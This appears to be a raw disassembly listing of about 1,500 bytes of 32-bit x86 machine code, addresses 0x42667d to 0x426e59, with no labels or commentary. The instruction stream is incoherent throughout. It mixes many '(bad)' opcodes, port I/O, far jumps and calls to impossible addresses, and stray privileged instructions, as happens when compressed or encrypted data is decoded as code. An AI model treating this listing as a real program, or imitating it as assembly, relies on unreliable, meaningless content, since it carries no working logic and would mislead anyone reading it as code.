  42667d:	lods   eax,DWORD PTR ds:[esi]
  42667e:	aad    0x7b
  426680:	mov    bl,0xd2
  426682:	retf   
  426683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426684:	addr16 or eax,edi
  426687:	call   0x34c4a0ed
  42668c:	mov    BYTE PTR [ecx],dh
  42668e:	push   ebx
  42668f:	mov    eax,0xfe94de4a
  426694:	push   0x44
  426696:	and    eax,0x50
  426699:	das    
  42669a:	scas   al,BYTE PTR es:[edi]
  42669b:	xchg   ebp,eax
  42669c:	pop    ecx
  42669d:	ja     0x4266eb
  42669f:	or     eax,0xb1793bd
  4266a4:	pop    ss
  4266a5:	xor    BYTE PTR [edx+0x202326f0],dh
  4266ab:	stos   BYTE PTR es:[edi],al
  4266ac:	int3   
  4266ad:	out    0xeb,eax
  4266af:	jmp    0x61c48667
  4266b4:	mov    ah,0xf6
  4266b6:	and    DWORD PTR [edi],ebx
  4266b8:	mov    ds:0xf5806718,al
  4266bd:	inc    ebx
  4266be:	or     BYTE PTR [ebp-0x4d],ah
  4266c1:	out    0x4e,eax
  4266c3:	sub    DWORD PTR [ebp-0x26],edx
  4266c6:	imul   esp,DWORD PTR [ebx+0xca23af4],0xae507ccf
  4266d0:	mov    dh,0x5a
  4266d2:	sbb    edx,ebx
  4266d4:	cdq    
  4266d5:	add    cl,BYTE PTR [ebx+0x2a86ee93]
  4266db:	push   edi
  4266dc:	and    al,0xeb
  4266de:	push   eax
  4266df:	xchg   ebp,eax
  4266e0:	push   0x46
  4266e2:	inc    esp
  4266e3:	mov    ecx,0xa402bf7e
  4266e8:	cmp    DWORD PTR [edx+ebx*1],ebx
  4266eb:	and    al,0x75
  4266ed:	(bad)  
  4266ee:	mov    bh,0xf4
  4266f0:	push   ds
  4266f1:	in     al,0x28
  4266f3:	push   esi
  4266f4:	inc    ebx
  4266f5:	pop    edi
  4266f6:	inc    esi
  4266f7:	clc    
  4266f8:	mov    ecx,0xccb97e28
  4266fd:	cli    
  4266fe:	inc    ebx
  4266ff:	dec    edx
  426700:	inc    ecx
  426701:	in     al,0x93
  426703:	add    DWORD PTR [ecx],0xffffff89
  426706:	and    bh,BYTE PTR [eax-0x70]
  426709:	xchg   edx,eax
  42670a:	or     ebx,DWORD PTR [eax]
  42670c:	jnp    0x4266f8
  42670e:	mov    al,ds:0xe89319e5
  426713:	cli    
  426714:	bound  ecx,QWORD PTR [eax]
  426716:	xor    dh,0xd6
  426719:	int3   
  42671a:	ins    BYTE PTR es:[edi],dx
  42671b:	ja     0x426727
  42671d:	retf   0x47c8
  426720:	in     eax,dx
  426721:	dec    edi
  426722:	xchg   esp,eax
  426723:	sbb    DWORD PTR [edi-0x7804ffbe],esp
  426729:	adc    al,0x43
  42672b:	sbb    eax,0x85f88006
  426730:	pop    edx
  426731:	ja     0x426725
  426733:	pop    edi
  426734:	sbb    al,0xd8
  426736:	or     dl,cl
  426738:	cwde   
  426739:	xor    eax,0xe63d2ee4
  42673e:	shr    BYTE PTR [edx+0x1e],1
  426741:	or     DWORD PTR [esi-0x63957347],ecx
  426747:	jb     0x426745
  426749:	sbb    al,0xd
  42674b:	xchg   edi,eax
  42674c:	or     dl,ch
  42674e:	xlat   BYTE PTR es:[ebx]
  426750:	or     eax,0xcbaedf3
  426755:	pop    ebx
  426756:	mov    esi,0x6ba6bb6c
  42675b:	and    DWORD PTR [esi],ecx
  42675d:	aam    0xba
  42675f:	lea    esp,[esi-0x58]
  426762:	rcl    BYTE PTR fs:[eax+0x6],0x8d
  426767:	push   edi
  426768:	jns    0x42674e
  42676a:	inc    ecx
  42676b:	mov    DWORD PTR [edi-0x64],esp
  42676e:	mov    bh,BYTE PTR [edi]
  426770:	outs   dx,DWORD PTR ds:[esi]
  426771:	pop    esp
  426772:	mov    ebx,0x1feca930
  426777:	idiv   DWORD PTR [edi+0x1c]
  42677a:	fadd   QWORD PTR [eax-0x34]
  42677d:	leave  
  42677e:	pop    esi
  42677f:	in     eax,0x57
  426781:	sub    al,0xe6
  426783:	mov    al,ds:0x72fb28c2
  426788:	inc    edx
  426789:	frstor [eax]
  42678b:	xchg   ecx,eax
  42678c:	mov    ebx,0x0
  426791:	add    BYTE PTR [ecx-0x126c16dc],al
  426797:	(bad)  
  426799:	ss cwde 
  42679b:	in     eax,0x27
  42679d:	inc    esp
  42679e:	js     0x426754
  4267a0:	out    dx,al
  4267a1:	and    bh,BYTE PTR [ebx-0xcfffe21]
  4267a7:	add    al,0x0
  4267a9:	add    BYTE PTR [ecx-0x98ff716],bl
  4267af:	loop   0x426816
  4267b1:	enter  0xe1cc,0x12
  4267b5:	pop    ebp
  4267b6:	sub    cl,BYTE PTR [edi-0x34445e96]
  4267bc:	push   es
  4267bd:	and    cl,BYTE PTR [esi+ecx*4-0x28fe4f9c]
  4267c4:	adc    BYTE PTR [ebx],0xd5
  4267c7:	xor    ch,BYTE PTR [ecx-0x49]
  4267ca:	and    BYTE PTR [esi+edi*4],bl
  4267cd:	xor    cl,cl
  4267cf:	xor    eax,0x138cbfed
  4267d4:	ret    
  4267d5:	cmp    edx,DWORD PTR [eax+0x23da42e3]
  4267db:	adc    BYTE PTR [eax-0x33],dh
  4267de:	(bad)  
  4267df:	adc    al,0xb6
  4267e1:	mov    cl,BYTE PTR [edx-0x2b]
  4267e4:	jmp    0xf55f5ea6
  4267e9:	inc    edx
  4267ea:	push   edi
  4267eb:	add    eax,0x2d1c7465
  4267f0:	addr16 (bad) 
  4267f2:	popa   
  4267f3:	cmc    
  4267f4:	inc    esi
  4267f5:	aad    0xe6
  4267f7:	mov    al,ch
  4267f9:	push   esp
  4267fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267fb:	cmp    BYTE PTR [eax],ch
  4267fd:	clc    
  4267fe:	nop
  4267ff:	aaa    
  426800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426801:	iret   
  426802:	gs sub bl,al
  426805:	mov    ch,0x4f
  426807:	unpcklps xmm4,XMMWORD PTR [ebx+0x27c53916]
  42680e:	cld    
  42680f:	hlt    
  426810:	idiv   BYTE PTR [eax]
  426812:	cmp    bh,bh
  426814:	cmp    dh,BYTE PTR [ebp-0x5d]
  426817:	rcr    ch,1
  426819:	sbb    ah,bl
  42681b:	mov    bh,0x30
  42681d:	shr    DWORD PTR [edi+ebx*2+0x15c37497],1
  426824:	xchg   esp,eax
  426825:	cmp    esp,esp
  426827:	ret    0x2a92
  42682a:	test   BYTE PTR [esp+ebp*2],dl
  42682d:	pushf  
  42682e:	sbb    eax,0x5e855643
  426833:	or     edi,DWORD PTR [ebp+0xa315e67]
  426839:	in     eax,dx
  42683a:	std    
  42683b:	jbe    0x42688c
  42683d:	xor    ecx,DWORD PTR ds:0x6cfa0890
  426843:	sub    eax,0xbec4cd56
  426848:	cmp    dh,BYTE PTR [edx+eiz*2]
  42684b:	sub    bl,BYTE PTR [edi+0x6167f425]
  426851:	mov    dh,0x9a
  426853:	ins    BYTE PTR es:[edi],dx
  426854:	xlat   BYTE PTR ds:[ebx]
  426855:	push   ss
  426856:	push   es
  426857:	mov    ebx,0x24ed996
  42685c:	add    ch,BYTE PTR [edx+esi*2+0x62ab51dd]
  426863:	arpl   WORD PTR [eax+0x5b87b865],bx
  426869:	(bad)  
  42686a:	iret   
  42686b:	mov    WORD PTR [edx+0x26534f07],fs
  426871:	add    cl,BYTE PTR [edx]
  426873:	jp     0x426836
  426875:	mov    ?,WORD PTR [ebp-0x7d]
  426878:	fnstenv [ebp-0x6d1c9e9a]
  42687e:	mov    al,0x35
  426880:	push   cs
  426881:	ins    DWORD PTR es:[edi],dx
  426882:	pop    esi
  426883:	mov    esi,0x3f21c235
  426888:	loop   0x4268fc
  42688a:	loopne 0x426875
  42688c:	(bad)  
  42688d:	loope  0x426846
  42688f:	sbb    bl,0x97
  426892:	add    al,0xbe
  426894:	aad    0x9c
  426896:	(bad)  
  426897:	rol    DWORD PTR [esp+edi*8],1
  42689a:	and    eax,esp
  42689c:	add    ebx,DWORD PTR [edx-0x4670fb0b]
  4268a2:	addr16 ja 0x4268c1
  4268a5:	mov    WORD PTR ds:0x5c753c4a,gs
  4268ab:	pop    esp
  4268ac:	or     al,0x1d
  4268ae:	xchg   ecx,eax
  4268af:	adc    ebx,ecx
  4268b1:	shl    BYTE PTR [esi+ecx*2+0x70],cl
  4268b5:	mov    eax,ds:0xad2c8d2e
  4268ba:	xchg   edx,eax
  4268bb:	fld    TBYTE PTR [ebx-0x5b]
  4268be:	fsubr  st(0),st
  4268c0:	mov    eax,ds:0xdcded480
  4268c5:	sub    eax,0x78cbe7d8
  4268ca:	and    edi,DWORD PTR [edx]
  4268cc:	(bad)  
  4268cd:	(bad)  
  4268ce:	fsub   DWORD PTR [edx-0x76]
  4268d1:	in     al,dx
  4268d2:	out    0xb4,al
  4268d4:	cld    
  4268d5:	fnsave [edx]
  4268d7:	out    dx,al
  4268d8:	repz mov esp,0xc5906e34
  4268de:	add    eax,0x74eab1eb
  4268e3:	stos   DWORD PTR es:[edi],eax
  4268e4:	pop    ss
  4268e5:	xchg   BYTE PTR [edi-0x71],bl
  4268e8:	mov    ecx,0x7a1e849e
  4268ed:	pop    esi
  4268ee:	dec    eax
  4268ef:	clc    
  4268f0:	adc    eax,0xaec87a45
  4268f5:	cmc    
  4268f6:	xor    eax,0x9508d155
  4268fb:	sub    dl,BYTE PTR [ebp+0x7c]
  4268fe:	mov    cl,0x96
  426900:	xor    edx,DWORD PTR [edi]
  426902:	push   es
  426903:	sub    al,0x8d
  426905:	shr    BYTE PTR [edx-0x269272cb],cl
  42690b:	sbb    BYTE PTR [edi],ch
  42690d:	nop
  42690e:	push   0x9c7e5dc5
  426913:	mov    fs,WORD PTR [ebx]
  426915:	and    eax,0x7cd72602
  42691a:	adc    eax,DWORD PTR [esi-0x17710f0a]
  426920:	pop    esp
  426921:	test   esi,ebp
  426923:	xchg   esi,eax
  426924:	gs das 
  426926:	add    ecx,DWORD PTR [edi]
  426928:	xchg   ebx,eax
  426929:	mov    esp,0x5e3200e6
  42692e:	mov    dh,0x96
  426930:	sub    bh,BYTE PTR [edx-0x1e40b457]
  426936:	xchg   ebx,eax
  426937:	mov    cl,0xb8
  426939:	mov    esp,0x29e619
  42693e:	loope  0x426993
  426940:	pop    es
  426941:	icebp  
  426942:	dec    ebx
  426943:	jb     0x426950
  426945:	and    BYTE PTR [ebx],bl
  426947:	dec    edx
  426948:	jmp    0x1376:0xaff8bfd8
  42694f:	jo     0xfed5d5dc
  426955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426956:	fist   DWORD PTR [esi+edi*4]
  426959:	inc    ebx
  42695a:	jg     0x426992
  42695c:	jge    0x426988
  42695e:	mov    al,ds:0x9a44c1ad
  426963:	jo     0x426928
  426965:	(bad)  
  426966:	ins    DWORD PTR es:[edi],dx
  426967:	ss cld 
  426969:	push   0xffffffc9
  42696b:	adc    eax,0x3376068d
  426970:	fld    DWORD PTR [edi]
  426972:	and    DWORD PTR [esi+0x76621d6e],ebp
  426978:	stos   BYTE PTR es:[edi],al
  426979:	xor    cl,BYTE PTR ds:0x6e7a703e
  42697f:	add    ebx,DWORD PTR ds:0xd3cfe707
  426985:	xor    ecx,DWORD PTR [ebp+0x42]
  426988:	push   cs
  426989:	cmp    al,0x4c
  42698b:	mov    bl,0xb4
  42698d:	push   esi
  42698e:	xchg   ebx,eax
  42698f:	mov    bl,0xdb
  426991:	adc    al,0xf9
  426993:	fld    QWORD PTR [ebp+0x6b]
  426996:	mov    ecx,DWORD PTR [ecx-0x63]
  426999:	sbb    bl,ah
  42699b:	clc    
  42699c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42699d:	cmp    ch,dh
  42699f:	sti    
  4269a0:	std    
  4269a1:	dec    edi
  4269a2:	fst    DWORD PTR [ebp+0x4a]
  4269a5:	addr16 into 
  4269a7:	adc    ebp,esp
  4269a9:	imul   esp,DWORD PTR [ebx+edi*4-0x70],0x2f
  4269ae:	xchg   esi,eax
  4269af:	pop    esi
  4269b0:	mov    ebp,0x4b1d6690
  4269b5:	pop    eax
  4269b6:	enter  0xe99e,0x83
  4269ba:	inc    esp
  4269bb:	mov    WORD PTR [ebp-0xe],si
  4269bf:	cmp    al,0xb7
  4269c1:	pop    esi
  4269c2:	pop    es
  4269c3:	mov    dl,0x57
  4269c5:	pop    ds
  4269c6:	sbb    DWORD PTR [ecx+edx*4+0x364d0c07],esi
  4269cd:	jbe    0x4269dc
  4269cf:	cmp    al,0x11
  4269d1:	lods   al,BYTE PTR ds:[esi]
  4269d2:	sub    bl,ah
  4269d4:	into   
  4269d5:	jmp    0xd292:0x8addd3bd
  4269dc:	jge    0x4269cb
  4269de:	jmp    0x42696a
  4269e0:	gs aaa 
  4269e2:	(bad)  
  4269e3:	sub    esp,esp
  4269e5:	cmp    BYTE PTR [eax-0x385bd3],ch
  4269eb:	jo     0x426a26
  4269ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269ee:	repz mov esi,0x98246d9f
  4269f4:	mov    al,0x3f
  4269f6:	mov    cs,WORD PTR [ebx]
  4269f8:	mov    ebp,0x23e8356d
  4269fd:	jp     0x426980
  4269ff:	ins    BYTE PTR es:[edi],dx
  426a00:	mov    esp,0xd803adba
  426a05:	sahf   
  426a06:	idiv   BYTE PTR [ebx-0x3543c141]
  426a0c:	dec    edi
  426a0d:	cdq    
  426a0e:	and    eax,0x91e2c642
  426a13:	and    esi,edi
  426a15:	sbb    esi,ecx
  426a17:	dec    ebx
  426a18:	call   0xa387:0x5a77a2b
  426a1f:	jb     0x426a4d
  426a21:	outs   dx,DWORD PTR ds:[esi]
  426a22:	sar    DWORD PTR ds:[edi+0x39],cl
  426a26:	and    DWORD PTR [ebx-0x25ca358c],ecx
  426a2c:	popa   
  426a2d:	lds    eax,FWORD PTR [edx+0x106e3c06]
  426a33:	(bad)  
  426a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a36:	call   DWORD PTR [esi+0x4e]
  426a39:	fwait
  426a3a:	cmp    eax,0x952b0078
  426a3f:	ins    DWORD PTR es:[edi],dx
  426a40:	mov    bh,0x23
  426a42:	or     cl,BYTE PTR [edi+0x4a]
  426a45:	jo     0x426a8a
  426a47:	js     0x4269e5
  426a49:	xor    DWORD PTR [edx+0x1],esi
  426a4c:	mov    WORD PTR [ebx+esi*8-0x33],es
  426a50:	add    DWORD PTR [ebx+0x41],0xffffff8d
  426a54:	in     eax,dx
  426a55:	cmc    
  426a56:	test   al,0xa6
  426a58:	shl    DWORD PTR [ebx],0x25
  426a5b:	cmp    eax,0x1f7e20c
  426a60:	lods   al,BYTE PTR ds:[esi]
  426a61:	and    esi,DWORD PTR [ebx+0x58]
  426a64:	in     eax,0x2b
  426a66:	and    BYTE PTR [ecx],cl
  426a68:	mov    dl,0x86
  426a6a:	pop    esp
  426a6b:	dec    eax
  426a6c:	jle    0x4269ef
  426a6e:	and    eax,0x74324023
  426a73:	push   esp
  426a74:	jecxz  0x426a30
  426a76:	icebp  
  426a77:	int3   
  426a78:	(bad)  
  426a79:	sbb    DWORD PTR [ecx-0x24],esp
  426a7c:	inc    edi
  426a7d:	lock data16 loopne 0x426aad
  426a81:	in     al,dx
  426a82:	mov    bh,0x2d
  426a84:	and    dh,ah
  426a86:	(bad)  
  426a87:	repnz aas 
  426a89:	ss int 0x58
  426a8c:	scas   eax,DWORD PTR es:[edi]
  426a8d:	pop    ecx
  426a8e:	sub    bl,BYTE PTR [ecx]
  426a90:	push   edi
  426a91:	push   0x8434cda9
  426a96:	pop    ebp
  426a97:	inc    ecx
  426a98:	test   eax,0x7e3ef782
  426a9d:	ror    esi,0x13
  426aa0:	or     BYTE PTR [edi+0x48],dh
  426aa3:	cmp    al,0x44
  426aa5:	fsub   QWORD PTR [esi+edx*1]
  426aa8:	xchg   ebp,eax
  426aa9:	push   esp
  426aaa:	dec    esp
  426aab:	add    DWORD PTR gs:0xd00c071d,edi
  426ab2:	call   0xfb120c90
  426ab7:	jno    0x426a63
  426ab9:	mov    dl,0xc0
  426abb:	adc    edi,edx
  426abd:	enter  0x924b,0x37
  426ac1:	mov    esp,es
  426ac3:	cmp    eax,DWORD PTR [edi]
  426ac5:	js     0x426ae7
  426ac7:	jecxz  0x426b43
  426ac9:	and    DWORD PTR [ecx-0x3e],0x81e7ca27
  426ad0:	mov    ebp,0xdcd601b9
  426ad5:	jle    0x426ad0
  426ad7:	scas   al,BYTE PTR es:[edi]
  426ad8:	jge    0x426b41
  426ada:	rcr    DWORD PTR [ebx-0x2e8357d4],0x2
  426ae1:	sub    esi,0xaa5eae1f
  426ae7:	pop    ebp
  426ae8:	dec    BYTE PTR [edx-0x20]
  426aeb:	push   ebx
  426aec:	daa    
  426aed:	lods   eax,DWORD PTR ds:[esi]
  426aee:	inc    edx
  426aef:	inc    eax
  426af0:	sub    DWORD PTR [ebp-0x588346f0],esp
  426af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af7:	adc    eax,ebp
  426af9:	loope  0x426b70
  426afb:	xor    eax,0xcece11b7
  426b00:	aad    0x84
  426b02:	mov    esp,0x36724970
  426b07:	jge    0x426b52
  426b09:	cmc    
  426b0a:	mov    al,al
  426b0c:	ret    
  426b0d:	pushf  
  426b0e:	repnz repnz mov dl,0xd2
  426b12:	int    0x5c
  426b14:	xor    BYTE PTR [ebx+0x711ecd55],bh
  426b1a:	jle    0x426ab2
  426b1c:	jmp    0x426adc
  426b1e:	gs inc esi
  426b20:	imul   esp,DWORD PTR [edx-0x3e44f6b1],0x66
  426b27:	mov    DWORD PTR [edi-0x28fed6be],ebp
  426b2d:	xchg   ebx,eax
  426b2e:	push   0x7679e166
  426b33:	in     al,dx
  426b34:	lock sub DWORD PTR [ecx-0x2f137ca3],ebx
  426b3b:	lods   al,BYTE PTR ds:[esi]
  426b3c:	mov    cl,0x71
  426b3e:	xor    DWORD PTR [ecx-0x65],edx
  426b41:	or     esi,0x5b4b1e4
  426b47:	iret   
  426b48:	sahf   
  426b49:	cli    
  426b4a:	icebp  
  426b4b:	xor    al,0xac
  426b4d:	out    dx,eax
  426b4e:	push   esp
  426b4f:	jge    0x426b24
  426b51:	cmp    dl,bh
  426b53:	and    ebx,DWORD PTR [ebp+0x7b8a7615]
  426b59:	test   ch,ch
  426b5b:	leave  
  426b5c:	fnsave [ebx]
  426b5e:	and    ch,BYTE PTR [ebx+0x3438153b]
  426b64:	xor    DWORD PTR [ecx],esi
  426b66:	xchg   BYTE PTR [eax+0x15efcdea],ah
  426b6c:	ret    
  426b6d:	jnp    0x426b18
  426b6f:	loopne 0x426bea
  426b71:	call   0xab80a7ea
  426b76:	jbe    0x426b49
  426b78:	daa    
  426b79:	inc    edi
  426b7a:	cmc    
  426b7b:	adc    edi,ebx
  426b7d:	gs or  eax,0xef359f8f
  426b83:	je     0x426bee
  426b85:	dec    ebp
  426b86:	(bad)  
  426b88:	xlat   BYTE PTR ds:[ebx]
  426b89:	clc    
  426b8a:	pop    eax
  426b8b:	push   cs
  426b8c:	jmp    0x426c05
  426b8e:	aam    0x7a
  426b90:	test   dl,0x35
  426b93:	add    ecx,esp
  426b95:	sbb    eax,0x93f89bd9
  426b9a:	loop   0x426b54
  426b9c:	pop    ds
  426b9d:	add    ebx,ecx
  426b9f:	or     BYTE PTR [eax-0x7e],ah
  426ba2:	push   eax
  426ba3:	aaa    
  426ba4:	push   0xffffffad
  426ba6:	jmp    0x226e:0x8b1714cf
  426bad:	adc    esp,DWORD PTR [ecx-0x78]
  426bb0:	mov    al,ds:0x60cb8a51
  426bb5:	adc    ebp,DWORD PTR [ecx+0xd]
  426bb8:	not    DWORD PTR [edi]
  426bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bbb:	add    bh,bl
  426bbd:	xor    ch,BYTE PTR [ebx-0x4e]
  426bc0:	ja     0x426b45
  426bc2:	clc    
  426bc3:	jmp    0x426bcf
  426bc5:	jne    0x426b94
  426bc7:	push   esp
  426bc8:	jnp    0x426c31
  426bca:	stos   DWORD PTR es:[edi],eax
  426bcb:	xlat   BYTE PTR ds:[ebx]
  426bcc:	shl    DWORD PTR [edi+0x26d11e98],0x18
  426bd3:	inc    edx
  426bd4:	mov    dh,0xdc
  426bd6:	mov    ebx,0xcaab3b62
  426bdb:	xchg   esp,eax
  426bdc:	cdq    
  426bdd:	cld    
  426bde:	xchg   esp,eax
  426bdf:	adc    al,0xb8
  426be1:	jns    0x426b9b
  426be3:	mov    ah,0x80
  426be5:	cmp    eax,0x3577787b
  426bea:	retf   0x7bb8
  426bed:	ret    0x752c
  426bf0:	dec    ecx
  426bf1:	pop    edx
  426bf2:	lods   al,BYTE PTR ds:[esi]
  426bf3:	in     eax,0xd9
  426bf5:	(bad)  
  426bf6:	ds mov esi,0xaf3e976c
  426bfc:	gs in  eax,0x9d
  426bff:	rcl    DWORD PTR [esi-0x3],cl
  426c02:	mov    bl,0xbf
  426c04:	cmp    al,0xd2
  426c06:	repnz jecxz 0x426bba
  426c09:	mov    ecx,0xffe966cc
  426c0e:	push   ebp
  426c0f:	dec    esp
  426c10:	loope  0x426bad
  426c12:	dec    ebp
  426c13:	pop    ebx
  426c14:	test   eax,0xb9dba408
  426c19:	(bad)  
  426c1a:	in     al,dx
  426c1b:	outs   dx,DWORD PTR ds:[esi]
  426c1c:	adc    al,0x14
  426c1e:	nop
  426c1f:	jns    0x426bac
  426c21:	mov    BYTE PTR [eax-0x145b5fd8],dh
  426c27:	inc    edi
  426c28:	mov    al,ds:0xd1fa9018
  426c2d:	xor    al,0xd7
  426c2f:	dec    ebp
  426c30:	xchg   DWORD PTR [ebx+ecx*8-0x5b],edi
  426c34:	push   DWORD PTR [ebx-0x6b]
  426c37:	imul   ebx,DWORD PTR [esi+0x62e20236],0x689f8caf
  426c41:	rol    DWORD PTR [esi-0x793079f],0xf2
  426c48:	cmp    ebx,DWORD PTR [eax-0x36323dc]
  426c4e:	(bad)  
  426c51:	and    dl,dl
  426c53:	add    al,0x2d
  426c55:	imul   ebp,DWORD PTR [ecx],0x27
  426c58:	inc    eax
  426c59:	mov    WORD PTR [ebp-0x64e2f64b],gs
  426c5f:	mul    BYTE PTR [ebp+0x6d750233]
  426c65:	aam    0x2e
  426c67:	mov    ecx,0x82706555
  426c6c:	in     eax,dx
  426c6d:	cmc    
  426c6e:	aam    0xf6
  426c70:	pminub mm6,QWORD PTR ds:0x5d6062c0
  426c77:	out    0x5c,eax
  426c79:	mov    DWORD PTR [edi-0x6e],ebx
  426c7c:	inc    ecx
  426c7d:	mov    ch,0xc5
  426c7f:	rcr    BYTE PTR [esi-0x75],0x64
  426c83:	fs jno 0x426c8a
  426c86:	inc    ecx
  426c87:	jg     0x426cc3
  426c89:	dec    esi
  426c8a:	jl     0x426c7a
  426c8c:	call   0xa917170b
  426c91:	pop    es
  426c92:	cs std 
  426c94:	cmp    bh,dl
  426c96:	adc    BYTE PTR [eax-0x2295f9af],bh
  426c9c:	push   0x0
  426ca1:	add    BYTE PTR [esi+0x5f451fc0],dl
  426ca7:	(bad)  
  426ca9:	rol    DWORD PTR [ebx+0x1be88e10],cl
  426caf:	scas   al,BYTE PTR es:[edi]
  426cb0:	(bad)  
  426cb1:	test   eax,0x1e4ae
  426cb6:	repz add al,0x0
  426cb9:	add    BYTE PTR [ebx+eiz*2-0x7e03d5c4],cl
  426cc0:	add    ebx,DWORD PTR [ecx+0x3245e114]
  426cc6:	cmp    al,0xe8
  426cc8:	or     BYTE PTR [ecx-0x67],dl
  426ccb:	xchg   BYTE PTR [ecx-0x3b],bl
  426cce:	push   0xae5ba8f0
  426cd3:	push   eax
  426cd4:	ss inc ebp
  426cd6:	push   esp
  426cd7:	xor    bh,ah
  426cd9:	jmp    0x53161187
  426cde:	sar    BYTE PTR [edx],cl
  426ce0:	rcl    edi,cl
  426ce2:	scas   eax,DWORD PTR es:[edi]
  426ce3:	cs sbb al,0xea
  426ce6:	aad    0xf5
  426ce8:	cmovne edx,DWORD PTR [edx]
  426ceb:	ret    
  426cec:	enter  0x1e2e,0x51
  426cf0:	mov    fs,WORD PTR [eax+eax*8+0x4c]
  426cf4:	repz add DWORD PTR ds:0x46cf575a,ebp
  426cfb:	mov    al,ds:0x6e20d0d0
  426d00:	ins    DWORD PTR es:[edi],dx
  426d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d02:	ja     0x426cce
  426d04:	mov    WORD PTR [esi-0xacd6deb],?
  426d0a:	jge    0x426ce6
  426d0c:	push   0x60
  426d0e:	pop    esp
  426d0f:	outs   dx,DWORD PTR ds:[esi]
  426d10:	sub    ebp,DWORD PTR [ebx-0x28028edb]
  426d16:	jnp    0x426cd5
  426d18:	in     al,0xc5
  426d1a:	jbe    0x426d8b
  426d1c:	popf   
  426d1d:	call   0x81b2339
  426d22:	ss div cl
  426d25:	std    
  426d26:	mov    edi,0xd7a39726
  426d2b:	in     al,dx
  426d2c:	das    
  426d2d:	jecxz  0x426d69
  426d2f:	inc    ebx
  426d30:	push   esi
  426d31:	sub    bl,BYTE PTR [edx+0x273c99b0]
  426d37:	imul   ebp,DWORD PTR [edx-0x29],0x41
  426d3b:	int3   
  426d3c:	fmulp  st(4),st
  426d3e:	add    BYTE PTR [edi+0x36],dh
  426d41:	and    dh,BYTE PTR [ebx-0x13]
  426d44:	and    DWORD PTR [edx-0x78],ecx
  426d47:	pop    ebp
  426d48:	(bad)  
  426d49:	dec    esi
  426d4a:	scas   al,BYTE PTR es:[edi]
  426d4b:	scas   eax,DWORD PTR es:[edi]
  426d4c:	cmc    
  426d4d:	loopne 0x426cf4
  426d4f:	mov    bl,0x24
  426d51:	xchg   ebx,eax
  426d52:	lea    ebp,[edx]
  426d54:	push   es
  426d55:	fs in  al,dx
  426d57:	dec    edi
  426d58:	js     0x426d2d
  426d5a:	and    al,0xf7
  426d5c:	mov    bl,0x7d
  426d5e:	cmp    al,0xbc
  426d60:	or     DWORD PTR [eax-0x4ba25e75],eax
  426d66:	(bad)  
  426d68:	jns    0x426d87
  426d6a:	mov    eax,0xfe7f347c
  426d6f:	or     esp,DWORD PTR [edx+ecx*8-0x1ce36ec]
  426d76:	out    dx,al
  426d77:	cmp    BYTE PTR [eax+0x5c8951a2],dl
  426d7d:	fbld   TBYTE PTR [edx]
  426d7f:	hlt    
  426d80:	pop    ebp
  426d81:	xchg   edi,eax
  426d82:	test   al,0x66
  426d84:	call   0x73c0:0x8a51e151
  426d8b:	mov    ebx,0xe6c84e0b
  426d90:	push   ebp
  426d91:	mov    edi,0xbd958be9
  426d96:	xchg   ebp,eax
  426d97:	call   0x3eb4d893
  426d9c:	xchg   ecx,eax
  426d9d:	add    cl,BYTE PTR [esp+ebx*2-0x6b]
  426da1:	sbb    BYTE PTR [ebx-0x58],ch
  426da4:	xchg   esp,eax
  426da5:	test   dl,al
  426da7:	mov    dh,BYTE PTR [edi-0x71]
  426daa:	sbb    ecx,esi
  426dac:	aad    0xde
  426dae:	inc    BYTE PTR [esi+0x22cfc256]
  426db4:	mov    cs,WORD PTR [edi+esi*2-0x22]
  426db8:	shl    BYTE PTR [bp+di+0x28],1
  426dbc:	lods   al,BYTE PTR ds:[esi]
  426dbd:	or     eax,eax
  426dbf:	test   al,0x82
  426dc1:	rol    BYTE PTR [edx+0x45],cl
  426dc4:	inc    esi
  426dc5:	sub    esi,ebp
  426dc7:	ret    0x73c2
  426dca:	xchg   ecx,eax
  426dcb:	sahf   
  426dcc:	loopne 0x426de2
  426dce:	(bad)
  426dd1:	sbb    DWORD PTR [edi+0x71],edx
  426dd4:	sar    DWORD PTR [edx+edi*4+0x1b],cl
  426dd8:	mov    DWORD PTR [ebx+0x6c2dea49],0x8f62da6
  426de2:	daa    
  426de3:	mov    ds,WORD PTR [ecx-0x77]
  426de6:	lods   eax,DWORD PTR ds:[esi]
  426de7:	push   esp
  426de8:	hlt    
  426de9:	jns    0x426e16
  426deb:	scas   eax,DWORD PTR es:[edi]
  426dec:	js     0x426dab
  426dee:	mov    ebx,0xc5da351d
  426df3:	out    dx,eax
  426df4:	inc    esp
  426df5:	add    ah,bl
  426df7:	sbb    al,0x66
  426df9:	mov    bl,0xb7
  426dfb:	jecxz  0x426e75
  426dfd:	addr16 fldz 
  426e00:	add    esi,DWORD PTR [edx-0x55f72167]
  426e06:	scas   al,BYTE PTR es:[edi]
  426e07:	xor    bl,BYTE PTR [esi]
  426e09:	sub    edx,DWORD PTR [ebp+0x73]
  426e0c:	mov    ecx,DWORD PTR [esi+eax*4]
  426e0f:	shl    eax,0x67
  426e12:	add    esi,DWORD PTR [edi+esi*1+0x209c3ec0]
  426e19:	loope  0x426ddc
  426e1b:	aam    0x2
  426e1d:	push   ds
  426e1e:	adc    ebp,eax
  426e20:	and    dh,BYTE PTR [ecx+0x71a80abb]
  426e26:	int3   
  426e27:	pop    es
  426e28:	mov    ebp,0x17c21355
  426e2d:	lods   al,BYTE PTR ds:[esi]
  426e2e:	stos   DWORD PTR es:[edi],eax
  426e2f:	mov    ecx,0x2a2a7609
  426e34:	in     al,dx
  426e35:	xor    DWORD PTR [edx+edx*4],ecx
  426e38:	and    eax,DWORD PTR ds:0x3c7d1908
  426e3e:	xchg   ebx,eax
  426e3f:	imul   edx,edx,0x9234144b
  426e45:	push   0x67365e51
  426e4a:	mov    WORD PTR [edx+eax*1],ss
  426e4d:	inc    ebp
  426e4e:	mov    edi,0x1830a8ce
  426e53:	stos   DWORD PTR es:[edi],eax
  426e54:	dec    eax
  426e55:	out    0x0,eax
  426e57:	jae    0x426eb0
  426e59:	push   es
